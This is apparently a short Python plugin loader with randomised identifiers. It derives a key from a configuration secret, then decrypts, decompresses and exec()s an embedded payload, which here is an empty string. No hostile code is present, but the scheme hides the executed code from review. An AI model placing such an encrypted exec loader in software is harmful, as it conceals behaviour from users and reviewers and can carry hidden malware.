
import base64 as EtUtuwvx
import zlib as ICXxBXIg
import hashlib as qdWQvoTi
from cryptography.fernet import Fernet as NSIVLJHK
from config import config as JtlSamHK

PJijdyXk = ""

try:
    # 从配置中获取密钥
    SmJekBfp = qdWQvoTi.sha256(JtlSamHK.plugin_secret_key.encode()).digest()
    vdpORQtJ = EtUtuwvx.urlsafe_b64encode(SmJekBfp)
    
    qxCuXNWS = NSIVLJHK(vdpORQtJ)
    iREyhtDS = qxCuXNWS.decrypt(EtUtuwvx.b64decode(PJijdyXk))
    exec(ICXxBXIg.decompress(iREyhtDS).decode('utf-8'))
except Exception as e:
    print(f"Error executing obfuscated plugin: {e}")
